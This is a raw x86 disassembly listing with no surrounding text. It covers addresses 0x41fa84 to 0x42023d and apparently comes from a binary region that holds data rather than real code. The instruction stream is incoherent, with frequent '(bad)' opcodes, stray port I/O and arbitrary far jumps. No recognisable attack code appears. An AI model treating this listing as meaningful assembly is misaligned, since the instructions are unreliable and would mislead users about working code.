  41fa84:	ss clc 
  41fa86:	fadd   QWORD PTR [eax]
  41fa88:	adc    eax,0x4e8bc8b9
  41fa8d:	dec    edx
  41fa8e:	pop    esi
  41fa8f:	push   eax
  41fa90:	sub    al,BYTE PTR [ebx]
  41fa92:	xor    al,0xe
  41fa94:	stos   DWORD PTR es:[edi],eax
  41fa95:	stos   DWORD PTR es:[edi],eax
  41fa96:	mov    al,0x24
  41fa98:	fcom   QWORD PTR [edx+0x767b2ac4]
  41fa9e:	push   esp
  41fa9f:	push   ecx
  41faa0:	mov    BYTE PTR [eax-0x3fe0dfb6],cl
  41faa6:	sahf   
  41faa7:	enter  0x5ff6,0xe7
  41faab:	and    eax,0x8821e2fb
  41fab0:	test   DWORD PTR [edx],eax
  41fab2:	pop    esi
  41fab3:	in     al,0x53
  41fab5:	xor    al,0x1c
  41fab7:	or     DWORD PTR [ebx],esi
  41fab9:	and    ebp,eax
  41fabb:	and    ebx,DWORD PTR ds:0x56852fa7
  41fac1:	ret    
  41fac2:	adc    ebx,edi
  41fac4:	inc    esi
  41fac5:	adc    ebp,esp
  41fac7:	push   esi
  41fac8:	jmp    0x3624:0x5b365365
  41facf:	int    0xc9
  41fad1:	stc    
  41fad2:	mov    eax,0xa1b257cf
  41fad7:	dec    eax
  41fad8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fad9:	lock mov bh,0x76
  41fadc:	mov    ch,0x6
  41fade:	pop    edx
  41fadf:	mov    ds:0xe859f8eb,al
  41fae4:	mov    al,ds:0x563f939f
  41fae9:	cmp    dl,BYTE PTR [ecx+0x39]
  41faec:	loopne 0x41fb6a
  41faee:	mov    ds:0xf4fb2c7,al
  41faf3:	arpl   bp,cx
  41faf5:	sbb    BYTE PTR [ebp-0x5087845e],0x72
  41fafc:	mov    esi,0xbed49809
  41fb01:	jmp    0x41fb23
  41fb03:	out    dx,eax
  41fb04:	arpl   WORD PTR [ecx+0xd],ax
  41fb07:	mov    ecx,DWORD PTR [ebx]
  41fb09:	pushf  
  41fb0a:	add    BYTE PTR [ecx-0x1f899fde],bh
  41fb10:	cld    
  41fb11:	rcl    BYTE PTR [ebp+0x6874a560],cl
  41fb17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb18:	xchg   BYTE PTR [eax-0x55bbbecc],dh
  41fb1e:	mov    bh,0x22
  41fb20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb21:	lods   al,BYTE PTR ds:[esi]
  41fb22:	jge    0x41fb8e
  41fb24:	in     al,dx
  41fb25:	jne    0x41fadb
  41fb27:	pop    ecx
  41fb28:	fstp   QWORD PTR [ecx]
  41fb2a:	in     al,dx
  41fb2b:	mov    ebp,0x7a18cfec
  41fb30:	test   DWORD PTR [ebx+0x21],0x46ee16f3
  41fb37:	stos   BYTE PTR es:[edi],al
  41fb38:	mov    esp,0x244453d1
  41fb3d:	cld    
  41fb3e:	fbstp  TBYTE PTR [edx-0x5b]
  41fb41:	ja     0x41fb08
  41fb43:	fs div dl
  41fb46:	adc    eax,0x11921493
  41fb4b:	in     al,dx
  41fb4c:	mov    bh,0x25
  41fb4e:	scas   eax,DWORD PTR es:[edi]
  41fb4f:	dec    ebx
  41fb50:	ja     0x41fb6b
  41fb52:	jmp    0x57fa:0x6d8b8dbc
  41fb59:	push   eax
  41fb5a:	push   edx
  41fb5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb5c:	enter  0xc199,0x97
  41fb60:	mov    WORD PTR [ebp+0x1c],ds
  41fb63:	comiss xmm6,xmm2
  41fb66:	inc    ebx
  41fb67:	(bad)  
  41fb68:	mov    cl,0x37
  41fb6a:	jmp    0x47c07795
  41fb6f:	test   edx,esp
  41fb71:	xor    BYTE PTR [esi+0x37],bl
  41fb74:	lock enter 0xa151,0xc4
  41fb79:	xor    bl,BYTE PTR [ebx]
  41fb7b:	idiv   DWORD PTR ds:0x48c48a35
  41fb81:	gs mov esi,0x1ceccce4
  41fb87:	mov    ds:0xd7c1f8f1,al
  41fb8c:	stos   DWORD PTR es:[edi],eax
  41fb8d:	das    
  41fb8e:	pusha  
  41fb8f:	les    ecx,FWORD PTR [edi+0x163fd352]
  41fb95:	outs   dx,BYTE PTR ds:[esi]
  41fb96:	ror    BYTE PTR [esi+ecx*4],0x9a
  41fb9a:	out    dx,eax
  41fb9b:	inc    edi
  41fb9c:	(bad)  
  41fb9d:	cli    
  41fb9e:	push   0xffffffdd
  41fba0:	jns    0x41fbc8
  41fba2:	mov    edx,0x5259af86
  41fba7:	addr16 xchg edx,eax
  41fba9:	add    BYTE PTR [ebp-0x53],cl
  41fbac:	pop    eax
  41fbad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fbae:	mov    edi,0x9161ddb8
  41fbb3:	pushf  
  41fbb4:	push   eax
  41fbb5:	mov    esp,0xb7087a74
  41fbba:	inc    ecx
  41fbbb:	or     DWORD PTR [ebx-0x17],ecx
  41fbbe:	iret   
  41fbbf:	xchg   ebp,esp
  41fbc1:	jge    0x41fb93
  41fbc3:	es mov esi,0x537bfdab
  41fbc9:	iret   
  41fbca:	mov    BYTE PTR [ebx],dl
  41fbcc:	and    edi,DWORD PTR [ecx+ebp*2]
  41fbcf:	or     BYTE PTR [edx],0xc5
  41fbd2:	add    eax,0x9e890909
  41fbd7:	and    eax,0x15191c2c
  41fbdc:	in     al,dx
  41fbdd:	popa   
  41fbde:	push   ss
  41fbdf:	push   esi
  41fbe0:	idiv   esp
  41fbe2:	ror    BYTE PTR [edi-0x61],cl
  41fbe5:	jne    0x41fc1c
  41fbe7:	mov    esp,esp
  41fbe9:	mov    esp,0x4edc0676
  41fbee:	mov    BYTE PTR [ebx+ecx*2-0x60d46752],al
  41fbf5:	test   esp,0xf041be39
  41fbfb:	jne    0x41fc27
  41fbfd:	data16 (bad) 
  41fbff:	lock xchg edi,eax
  41fc01:	arpl   si,si
  41fc03:	mov    fs,WORD PTR [edi+0x50]
  41fc06:	stc    
  41fc07:	xor    dl,dh
  41fc09:	imul   edi,DWORD PTR [edi+0x1],0xffffffdb
  41fc0d:	mov    ebp,0xb01fb423
  41fc12:	aas    
  41fc13:	loop   0x41fc3b
  41fc15:	push   ebx
  41fc16:	sub    al,0xac
  41fc18:	add    DWORD PTR ds:0x60cb7ecc,ecx
  41fc1e:	(bad)  
  41fc1f:	lds    eax,FWORD PTR ds:0x91300f26
  41fc25:	(bad)  
  41fc26:	ja     0x41fc8a
  41fc28:	xchg   ebx,eax
  41fc29:	jmp    0x41fbd1
  41fc2b:	sub    BYTE PTR [ebp+0x3e6db21e],al
  41fc31:	or     ebx,DWORD PTR [esi]
  41fc33:	cmp    edi,ebp
  41fc35:	fwait
  41fc36:	mov    ebp,DWORD PTR [ebx+0x41effb56]
  41fc3c:	mov    al,0xe8
  41fc3e:	fst    DWORD PTR fs:[edx+0x6a]
  41fc42:	xor    DWORD PTR [edx],edi
  41fc44:	and    DWORD PTR [ecx],ebx
  41fc46:	jecxz  0x41fc78
  41fc48:	mov    ds:0x3b00f3bc,eax
  41fc4d:	mov    ah,BYTE PTR ds:0x69e7dc56
  41fc53:	sub    esp,DWORD PTR [esi-0x1384af9f]
  41fc59:	test   BYTE PTR [eax],ch
  41fc5b:	jno    0x41fc8d
  41fc5d:	adc    BYTE PTR ss:[edx+ebp*2+0x2b],al
  41fc62:	inc    edx
  41fc63:	inc    ecx
  41fc64:	xchg   ebp,eax
  41fc65:	out    0xd,al
  41fc67:	push   0x15
  41fc69:	dec    edx
  41fc6a:	xor    esp,0xfffffffd
  41fc6d:	imul   edi,DWORD PTR [edi+esi*4+0x1562c5a],0xffffffeb
  41fc75:	ficomp DWORD PTR [esi+0x17]
  41fc78:	retf   
  41fc79:	rcl    BYTE PTR [ebp-0x59dea1ad],cl
  41fc7f:	imul   esi,DWORD PTR [ecx],0x280245b
  41fc85:	(bad)  
  41fc89:	das    
  41fc8a:	push   0xce73e55d
  41fc8f:	(bad)  
  41fc90:	out    dx,eax
  41fc91:	aam    0x46
  41fc93:	ja     0x41fd11
  41fc95:	fwait
  41fc96:	repnz (bad)
  41fc99:	lods   al,BYTE PTR ds:[esi]
  41fc9a:	call   FWORD PTR ds:0x91c8f2b
  41fca0:	scas   al,BYTE PTR es:[edi]
  41fca1:	fistp  DWORD PTR [ebx]
  41fca3:	mov    fs,edi
  41fca5:	adc    DWORD PTR [esi],0x1b92c30
  41fcab:	adc    DWORD PTR [ecx],ebp
  41fcad:	mov    ah,0xf0
  41fcaf:	dec    edi
  41fcb0:	test   DWORD PTR [esi+eax*1-0x68],edx
  41fcb4:	mov    cl,0x9d
  41fcb6:	loope  0x41fd32
  41fcb8:	push   ebx
  41fcb9:	jmp    0x87b6e405
  41fcbe:	je     0x41fd20
  41fcc0:	(bad)  
  41fcc1:	imul   eax,DWORD PTR [esi+edx*2+0x7a],0x6ff0c118
  41fcc9:	popa   
  41fcca:	call   0x89138a90
  41fccf:	loop   0x41fc62
  41fcd1:	inc    ebx
  41fcd2:	fld    TBYTE PTR [ecx-0x31]
  41fcd5:	mov    esp,0xe8c6019d
  41fcda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fcdb:	pusha  
  41fcdc:	or     al,0x5b
  41fcde:	les    edx,FWORD PTR [eax]
  41fce0:	sbb    ch,al
  41fce2:	fldcw  WORD PTR [esi-0x520f5bc3]
  41fce8:	sbb    al,0x33
  41fcea:	jne    0x41fd6a
  41fcec:	js     0x41fd6a
  41fcee:	lods   al,BYTE PTR cs:[esi]
  41fcf0:	xor    DWORD PTR ds:0xd6a55c4,esp
  41fcf6:	sub    bl,BYTE PTR ds:0x2a3c943d
  41fcfc:	cmp    DWORD PTR [ebx],ecx
  41fcfe:	push   edi
  41fcff:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41fd01:	mov    ebx,0x86899f8f
  41fd06:	pop    es
  41fd07:	dec    esi
  41fd08:	outs   dx,BYTE PTR ds:[esi]
  41fd09:	mov    bh,0x6f
  41fd0b:	dec    di
  41fd0d:	lods   eax,DWORD PTR ds:[esi]
  41fd0e:	shr    BYTE PTR [edx+0x45],0x46
  41fd12:	push   edi
  41fd13:	es adc esp,esi
  41fd16:	sbb    eax,0x90c3d5cd
  41fd1b:	test   al,0x9f
  41fd1d:	in     al,0x66
  41fd1f:	xchg   ecx,eax
  41fd20:	inc    edx
  41fd21:	mov    esi,0x2820958a
  41fd26:	adc    esp,DWORD PTR [ecx]
  41fd28:	cwde   
  41fd29:	sub    ch,BYTE PTR cs:0xeb5ad878
  41fd30:	stos   DWORD PTR es:[edi],eax
  41fd31:	mov    DWORD PTR [edx+0x70],ebx
  41fd34:	add    al,BYTE PTR [ebx]
  41fd36:	aaa    
  41fd37:	mov    ah,0xfd
  41fd39:	stos   DWORD PTR es:[edi],eax
  41fd3a:	loope  0x41fd8b
  41fd3c:	add    ch,bl
  41fd3e:	addr16 out 0xa4,al
  41fd41:	dec    esp
  41fd42:	jge    0x41fd46
  41fd44:	sbb    eax,0xf1643652
  41fd49:	outs   dx,DWORD PTR ds:[esi]
  41fd4a:	add    al,0xb4
  41fd4c:	loopne 0x41fd86
  41fd4e:	jg     0x41fd9f
  41fd50:	fst    QWORD PTR [edx]
  41fd52:	mov    cl,0xa
  41fd54:	and    BYTE PTR [esi-0x7b],bh
  41fd57:	imul   esp,esp,0x55
  41fd5a:	adc    BYTE PTR [eax+0x51],bh
  41fd5d:	mov    ds:0x54c14470,al
  41fd62:	popf   
  41fd63:	(bad)  
  41fd65:	or     bh,BYTE PTR [eax+0x14e8ffcd]
  41fd6b:	sub    eax,0x6bfee751
  41fd70:	mov    dl,0xea
  41fd72:	push   cs
  41fd73:	cmp    al,0x66
  41fd75:	iret   
  41fd76:	adc    DWORD PTR [esi],eax
  41fd78:	xchg   ebx,eax
  41fd79:	jb     0x41fdda
  41fd7b:	jmp    0x41fd42
  41fd7d:	fdiv   DWORD PTR [eax-0x6b]
  41fd80:	pop    es
  41fd81:	retf   
  41fd82:	retf   0x1f10
  41fd85:	imul   edx,DWORD PTR cs:[edx-0x16068050],0xffffffcc
  41fd8d:	mov    al,0x98
  41fd8f:	sub    ecx,0xffffffe1
  41fd92:	in     al,0x69
  41fd94:	retf   0x6e2
  41fd97:	(bad)  
  41fd98:	and    al,BYTE PTR [ebx-0x7b]
  41fd9b:	sub    dl,BYTE PTR [edx+0x16d264e3]
  41fda1:	xchg   ecx,eax
  41fda2:	or     al,0x46
  41fda4:	push   esi
  41fda5:	dec    edi
  41fda6:	out    0xaa,eax
  41fda8:	cdq    
  41fda9:	outs   dx,BYTE PTR ds:[esi]
  41fdaa:	xchg   BYTE PTR [eax+0x59],bh
  41fdad:	(bad)  [eax+0x472fbdec]
  41fdb3:	adc    DWORD PTR [eax-0x6f],esi
  41fdb6:	cld    
  41fdb7:	repnz and bh,cl
  41fdba:	xor    al,0x0
  41fdbc:	xor    al,0x2a
  41fdbe:	sub    al,0xda
  41fdc0:	ja     0x41fd61
  41fdc2:	mov    bl,0x7a
  41fdc4:	shl    bl,1
  41fdc6:	jg     0x41fd89
  41fdc8:	fsub   st(4),st
  41fdca:	pop    es
  41fdcb:	and    al,0x21
  41fdcd:	popf   
  41fdce:	retf   0xa
  41fdd1:	sbb    eax,0xaf23559c
  41fdd6:	pop    ecx
  41fdd7:	(bad)  
  41fdd9:	dec    esi
  41fdda:	ins    DWORD PTR es:[edi],dx
  41fddb:	aaa    
  41fddc:	dec    ecx
  41fddd:	test   eax,0xf1cb6a83
  41fde2:	inc    ebx
  41fde3:	inc    eax
  41fde4:	push   ds
  41fde5:	or     edx,ebx
  41fde7:	push   ss
  41fde8:	repz mov edx,DWORD PTR [ecx+0xcb7624d]
  41fdef:	add    bh,BYTE PTR ds:0x74952c9c
  41fdf5:	push   edi
  41fdf6:	fwait
  41fdf7:	ds sbb al,0xfa
  41fdfa:	call   0x231c:0x1d5a3d9c
  41fe01:	pushf  
  41fe02:	shl    BYTE PTR ds:[ecx+0x43],0x39
  41fe07:	inc    edx
  41fe08:	mov    ah,0xd3
  41fe0a:	push   esi
  41fe0b:	dec    edi
  41fe0c:	sub    DWORD PTR [edx+0x6324446e],esp
  41fe12:	pop    ebx
  41fe13:	push   ebx
  41fe14:	(bad)  
  41fe15:	(bad)  ds:0x393963cc
  41fe1b:	pusha  
  41fe1c:	push   ecx
  41fe1d:	jo     0x41fe01
  41fe1f:	test   BYTE PTR [esi-0x7d],ah
  41fe22:	retf   
  41fe23:	pop    ds
  41fe24:	and    al,BYTE PTR ds:0x433d86ae
  41fe2a:	add    esp,edi
  41fe2c:	cwde   
  41fe2d:	adc    BYTE PTR [ecx+ecx*4+0x72],bl
  41fe31:	mov    ebx,0x6970a861
  41fe36:	stos   DWORD PTR es:[edi],eax
  41fe37:	int3   
  41fe38:	or     ecx,edi
  41fe3a:	add    dh,dl
  41fe3c:	inc    ebx
  41fe3d:	cmp    BYTE PTR [ebp-0x727737db],ah
  41fe43:	jmp    0xc519e573
  41fe48:	jge    0x41feb8
  41fe4a:	(bad)  
  41fe4b:	(bad)
  41fe4e:	cmp    dl,dh
  41fe50:	push   esi
  41fe51:	ss dec edx
  41fe53:	ins    DWORD PTR es:[edi],dx
  41fe54:	cmc    
  41fe55:	pop    edx
  41fe56:	xchg   ebp,eax
  41fe57:	rcl    BYTE PTR [eax-0xd],0x53
  41fe5b:	mov    ecx,0x65066af6
  41fe60:	mov    edx,0x47ecc6d4
  41fe65:	inc    ebx
  41fe66:	ror    DWORD PTR [ebp+0x6f],0xff
  41fe6a:	or     ch,cl
  41fe6c:	inc    edi
  41fe6d:	addr16 pop ecx
  41fe6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe70:	das    
  41fe71:	or     ecx,edi
  41fe73:	mov    ebx,0xa26ee574
  41fe78:	or     eax,esi
  41fe7a:	mov    bh,0x1d
  41fe7c:	rcr    cl,0xea
  41fe7f:	(bad)  
  41fe80:	push   ebx
  41fe81:	xchg   ch,dl
  41fe83:	or     eax,0x3359d4ac
  41fe88:	or     ebx,DWORD PTR [eax+0x3bc0b24c]
  41fe8e:	xchg   esp,eax
  41fe8f:	jne    0x41fe79
  41fe91:	xchg   edi,eax
  41fe92:	mov    eax,0x68af969d
  41fe97:	jecxz  0x41fe88
  41fe99:	adc    esi,0xec287b09
  41fe9f:	sahf   
  41fea0:	sub    esp,0xffffff8e
  41fea3:	mov    ds:0xc38abc7a,al
  41fea8:	inc    BYTE PTR [ebp-0x42b57879]
  41feae:	sub    BYTE PTR [ebx+eax*1+0x7f],0xf7
  41feb3:	fdivr  QWORD PTR [ebp+0x2b]
  41feb6:	lock ret 
  41feb8:	pop    edx
  41feb9:	(bad)  
  41feba:	fwait
  41febb:	xchg   edi,eax
  41febc:	sbb    esp,edx
  41febe:	inc    esi
  41febf:	jno    0x41fec6
  41fec1:	mov    ch,ch
  41fec3:	and    ebx,DWORD PTR [ebx]
  41fec5:	shl    DWORD PTR [edx],1
  41fec7:	dec    esp
  41fec8:	add    BYTE PTR [edx+0x47006326],0xe8
  41fecf:	xor    dh,BYTE PTR [ecx+0x20]
  41fed2:	adc    al,0x41
  41fed4:	rol    DWORD PTR [edx-0x2157ac4c],1
  41feda:	ins    DWORD PTR es:[edi],dx
  41fedb:	inc    esp
  41fedc:	xor    dl,BYTE PTR [ecx+0x5c]
  41fedf:	repnz and al,BYTE PTR [ebx-0x66c55d0]
  41fee6:	call   0x25ea878f
  41feeb:	lea    esi,[ebx+0x187354ef]
  41fef1:	shr    DWORD PTR [edx+ecx*4-0x12],cl
  41fef5:	pop    edx
  41fef6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fef7:	or     ah,BYTE PTR [edi-0x45b6af81]
  41fefd:	xchg   edx,eax
  41fefe:	rcr    BYTE PTR [edi],0x12
  41ff01:	dec    esi
  41ff02:	xchg   DWORD PTR [ecx+ecx*2+0x65],esp
  41ff06:	test   DWORD PTR [ebp+0x1b],ebx
  41ff09:	sub    al,0x41
  41ff0b:	aas    
  41ff0c:	or     ebx,DWORD PTR [ebx+0x28]
  41ff0f:	loop   0x41fec9
  41ff11:	addr16 or eax,0x2bf4aa61
  41ff17:	dec    DWORD PTR [eax]
  41ff19:	in     al,0x97
  41ff1b:	ret    0x6338
  41ff1e:	outs   dx,DWORD PTR ds:[esi]
  41ff1f:	pop    ecx
  41ff20:	xchg   edx,eax
  41ff21:	inc    edi
  41ff22:	retf   
  41ff23:	cwde   
  41ff24:	shl    DWORD PTR [eax+esi*4+0x13929b93],0x8a
  41ff2c:	pop    eax
  41ff2d:	retf   0xb71
  41ff30:	aad    0x11
  41ff32:	sbb    BYTE PTR [edi+0x6bfaf465],bl
  41ff38:	cwde   
  41ff39:	out    dx,al
  41ff3a:	iret   
  41ff3b:	or     DWORD PTR [ebx*8-0x6760acf7],edi
  41ff42:	jecxz  0x41feff
  41ff44:	mov    cl,0x15
  41ff46:	jmp    0xc6c9:0xdaf818c3
  41ff4d:	xchg   ebp,eax
  41ff4e:	lods   al,BYTE PTR ds:[esi]
  41ff4f:	jb     0x41ff3e
  41ff51:	fnstsw WORD PTR [ebx-0x6dc1c64b]
  41ff57:	mov    eax,0xe77990c0
  41ff5c:	mov    ebx,DWORD PTR [edx+0x5f6718f4]
  41ff62:	aas    
  41ff63:	arpl   WORD PTR [ecx+0x7674ca88],di
  41ff69:	xor    eax,0xc085cdaf
  41ff6e:	ret    0x5c4f
  41ff71:	or     dh,BYTE PTR [ecx+0x43a80109]
  41ff77:	dec    edi
  41ff78:	aaa    
  41ff79:	pop    edx
  41ff7a:	sbb    bh,ch
  41ff7c:	mov    eax,ds:0xcf2d411b
  41ff81:	xor    edx,DWORD PTR [ecx+edi*1+0x555b2628]
  41ff88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff89:	jb     0x420000
  41ff8b:	push   eax
  41ff8c:	xlat   BYTE PTR ds:[ebx]
  41ff8d:	pop    ss
  41ff8e:	mov    ds:0xd11d08c8,al
  41ff93:	xor    bl,BYTE PTR [edx]
  41ff95:	cmp    BYTE PTR [edi-0x31d6a9a4],0xbe
  41ff9c:	daa    
  41ff9d:	shr    BYTE PTR [esp+edx*8+0x1c29b746],0xd0
  41ffa5:	xchg   edi,eax
  41ffa6:	popa   
  41ffa7:	out    dx,al
  41ffa8:	mov    eax,0xf0904def
  41ffad:	push   eax
  41ffae:	int    0x23
  41ffb0:	pop    ss
  41ffb1:	repz adc DWORD PTR [eax+0xb57b555],eax
  41ffb8:	or     cl,cl
  41ffba:	jmp    0xe40a:0x47b8c223
  41ffc1:	data16 (bad) 
  41ffc3:	jmp    0xbb81cd93
  41ffc8:	scas   al,BYTE PTR es:[edi]
  41ffc9:	dec    esi
  41ffca:	(bad)  
  41ffcc:	jns    0x41ff84
  41ffce:	jno    0x420009
  41ffd0:	mov    ds:0x2239d807,al
  41ffd5:	jo     0x41ff73
  41ffd7:	xor    eax,0x94a12520
  41ffdc:	cmp    dl,BYTE PTR [eax]
  41ffde:	gs pusha 
  41ffe0:	sub    bh,al
  41ffe2:	cmp    DWORD PTR [ebp-0x4b5bb65d],ecx
  41ffe8:	adc    BYTE PTR [ecx+0x5a0cb3e4],bh
  41ffee:	icebp  
  41ffef:	(bad)  
  41fff0:	fwait
  41fff1:	test   BYTE PTR [edi+0x7e],bl
  41fff4:	jbe    0x41ff94
  41fff6:	in     al,dx
  41fff7:	jb     0x42003b
  41fff9:	sbb    eax,0xe5f9e9c6
  41fffe:	int3   
  41ffff:	fs push esi
  420001:	mov    ch,0x63
  420003:	dec    ecx
  420004:	iret   
  420005:	clc    
  420006:	outs   dx,DWORD PTR ds:[esi]
  420007:	mov    dh,BYTE PTR [edx-0xe9e7c7d]
  42000d:	scas   al,BYTE PTR es:[edi]
  42000e:	stos   BYTE PTR es:[edi],al
  42000f:	adc    BYTE PTR [esp+eax*2],ah
  420012:	mov    BYTE PTR [ecx+0x127d6c6d],dh
  420018:	pop    eax
  420019:	mov    dh,0xd5
  42001b:	jmp    0xc91dd512
  420020:	imul   esi,edi,0x19
  420023:	(bad)  
  420025:	(bad)  
  420026:	fcomip st,st(4)
  420028:	(bad)  [ecx+0x1e736211]
  42002e:	loopne 0x41ffd0
  420030:	cmp    edx,ecx
  420032:	add    esi,edi
  420034:	cmp    eax,0x5bf8f8e6
  420039:	popf   
  42003a:	xchg   BYTE PTR [edx+0x633b77ea],ah
  420040:	inc    ebx
  420041:	pop    ecx
  420042:	gs (bad) 
  420044:	stc    
  420045:	xchg   edi,eax
  420046:	ret    0xc9ef
  420049:	jne    0x4200c9
  42004b:	js     0x41fff4
  42004d:	enter  0x65b0,0x6f
  420051:	shl    DWORD PTR [eax],1
  420053:	adc    eax,0x519c983f
  420058:	loopne 0x4200bf
  42005a:	fwait
  42005b:	cs std 
  42005d:	push   0x43
  42005f:	popf   
  420060:	fsubr  st(6),st
  420062:	ret    0x5641
  420065:	dec    ebx
  420066:	inc    eax
  420067:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420068:	stos   DWORD PTR es:[edi],eax
  420069:	(bad)  
  42006a:	data16 into 
  42006c:	inc    ebx
  42006d:	fs mov eax,0x4cedd1f9
  420073:	push   ebx
  420074:	mov    bh,0x52
  420076:	fld    st(7)
  420078:	lock and edi,DWORD PTR [edx+eiz*4+0x292c8c71]
  420080:	jnp    0x4200d4
  420082:	jns    0x42005e
  420084:	xor    al,0x53
  420086:	mov    DWORD PTR [esi-0x6c46caa2],edx
  42008c:	sbb    al,0xaf
  42008e:	retf   
  42008f:	test   DWORD PTR [eax+0x62],0xdb580332
  420096:	inc    edx
  420097:	or     DWORD PTR ds:0x5487e59c,ecx
  42009d:	pop    esp
  42009e:	xchg   edx,eax
  42009f:	jp     0x420051
  4200a1:	add    al,0x43
  4200a3:	push   eax
  4200a4:	int    0x13
  4200a6:	pop    eax
  4200a7:	call   0x53ef:0x6726e0f
  4200ae:	push   ss
  4200af:	(bad)  
  4200b1:	xchg   ebp,eax
  4200b2:	xor    eax,0x529bc11
  4200b7:	sbb    esp,DWORD PTR [edi-0x6d3e1178]
  4200bd:	cli    
  4200be:	dec    ebx
  4200bf:	add    eax,0x91b69e2a
  4200c4:	out    0x23,al
  4200c6:	and    eax,0xc587a3b5
  4200cb:	adc    edi,DWORD PTR [eax-0x3b]
  4200ce:	cli    
  4200cf:	test   eax,0xff00d8a6
  4200d4:	fs (bad) 
  4200d6:	bound  edi,QWORD PTR [esi-0x57c333ed]
  4200dc:	stc    
  4200dd:	mov    ecx,0xb4bc5cc3
  4200e2:	cs aas 
  4200e4:	ss jne 0x420109
  4200e7:	mov    dh,0x8e
  4200e9:	cld    
  4200ea:	jecxz  0x4200be
  4200ec:	mov    ebx,0x8169ac8e
  4200f1:	push   ss
  4200f2:	(bad)  
  4200f3:	in     al,0xa5
  4200f5:	xchg   BYTE PTR [edx+0x75],cl
  4200f8:	ins    BYTE PTR es:[edi],dx
  4200f9:	jne    0x42016a
  4200fb:	jno    0x420108
  4200fd:	and    ch,ch
  4200ff:	inc    edx
  420100:	cmp    dl,BYTE PTR [edx+ebx*8-0x709f92e]
  420107:	jmp    0xa12a:0x4532cd59
  42010e:	cli    
  42010f:	dec    eax
  420110:	pop    edi
  420111:	cmp    esi,DWORD PTR [edx+ebp*4]
  420114:	shl    BYTE PTR [eax-0x39],cl
  420117:	mov    eax,0x11fe9368
  42011c:	mov    eax,0xcdbf3c83
  420121:	push   edi
  420122:	leave  
  420123:	jle    0x420128
  420125:	(bad)  
  420126:	pushf  
  420127:	dec    ebx
  420128:	dec    eax
  420129:	fwait
  42012a:	out    dx,al
  42012b:	xchg   ecx,eax
  42012c:	inc    ecx
  42012d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42012e:	ja     0x4200bd
  420130:	sub    DWORD PTR ds:0x3dd7,0xc9934218
  420139:	pop    eax
  42013a:	push   ebp
  42013b:	mov    ds:0xe3f8b5b0,eax
  420140:	inc    esi
  420141:	sub    al,0xc5
  420144:	inc    edx
  420145:	shl    DWORD PTR [esi-0x5c5de08c],1
  42014b:	xchg   ecx,eax
  42014c:	mov    al,ds:0x5ed4a3c8
  420151:	add    bl,BYTE PTR [ecx+0x3a]
  420154:	or     al,0xe2
  420156:	mov    esp,0x8742a04a
  42015b:	(bad)  
  42015c:	int3   
  42015d:	aam    0x34
  42015f:	or     eax,0x8a0d2cc7
  420164:	mov    ecx,0xa8fa01fe
  420169:	bnd jo 0x42013d
  42016c:	sub    ebx,DWORD PTR [edx+eax*4-0x1c]
  420170:	sub    al,0x6b
  420172:	mov    cl,0x15
  420174:	xchg   edx,eax
  420175:	mov    ebp,0xfd48ca8d
  42017a:	aad    0xb6
  42017c:	fdivr  DWORD PTR cs:[edi+0xa]
  420180:	sbb    BYTE PTR [ebp-0x6f],ah
  420183:	or     edx,DWORD PTR [edx-0x994e338]
  420189:	(bad)  
  42018a:	loope  0x420111
  42018c:	call   0x67e03a2b
  420191:	mov    ebx,0xb77b69ac
  420196:	or     eax,0x4dfd8969
  42019b:	sub    eax,0xf56fbdae
  4201a0:	test   eax,0x3cbc4b7f
  4201a5:	or     al,cl
  4201a7:	mov    al,0xb1
  4201a9:	mov    WORD PTR es:[edx-0x1eb7f77f],gs
  4201b0:	add    BYTE PTR [ebx+edx*8-0x5e],dl
  4201b4:	mov    esp,0x3ff5a770
  4201b9:	popf   
  4201ba:	cs cld 
  4201bc:	push   0xffffff8b
  4201be:	ins    DWORD PTR es:[edi],dx
  4201bf:	xchg   esi,eax
  4201c0:	out    0x17,al
  4201c2:	out    dx,al
  4201c3:	mov    BYTE PTR [ebx+0x76362a50],ch
  4201c9:	nop
  4201ca:	(bad)  
  4201cb:	mov    esi,0xbc58f96e
  4201d0:	add    eax,0xe13e0681
  4201d5:	sub    eax,0x1e6dfc4e
  4201da:	shr    BYTE PTR [eax+0x2],1
  4201dd:	repnz xlat BYTE PTR ds:[ebx]
  4201df:	das    
  4201e0:	mov    BYTE PTR [ecx+0x61bc4165],ch
  4201e6:	aam    0xfa
  4201e8:	cmp    cl,BYTE PTR [ebp+0x4f]
  4201eb:	rcr    edi,cl
  4201ed:	mov    ds:0x2c6ab5d6,eax
  4201f2:	ins    BYTE PTR es:[edi],dx
  4201f3:	push   0xffffff8f
  4201f5:	sti    
  4201f6:	xchg   ebx,eax
  4201f7:	add    bh,BYTE PTR [ebp-0x3bf467a]
  4201fd:	mov    dh,0xda
  4201ff:	and    BYTE PTR ds:0x321a0087,dh
  420205:	inc    esp
  420206:	jle    0x42021a
  420208:	xchg   BYTE PTR [ecx+ebp*4-0x57198612],ch
  42020f:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  420211:	add    edi,DWORD PTR [eax+0xc]
  420214:	ins    BYTE PTR es:[edi],dx
  420215:	hlt    
  420216:	popa   
  420217:	add    eax,0x8057895c
  42021c:	dec    eax
  42021d:	inc    ebx
  42021e:	push   esi
  42021f:	repnz ds scas al,BYTE PTR es:[edi]
  420222:	inc    eax
  420223:	stos   DWORD PTR es:[edi],eax
  420224:	adc    ecx,edx
  420226:	cmp    bh,al
  420228:	loop   0x420262
  42022a:	xchg   edx,eax
  42022b:	or     ebp,DWORD PTR [esi-0x382db937]
  420231:	scas   al,BYTE PTR es:[edi]
  420232:	leave  
  420233:	sub    dh,BYTE PTR [eax]
  420235:	test   al,0x6c
  420237:	add    al,0xf3
  420239:	pop    ecx
  42023a:	stos   DWORD PTR es:[edi],eax
  42023b:	outs   dx,BYTE PTR ds:[esi]
  42023c:	(bad)  
  42023d:	mov    ebp,0xcb95a542
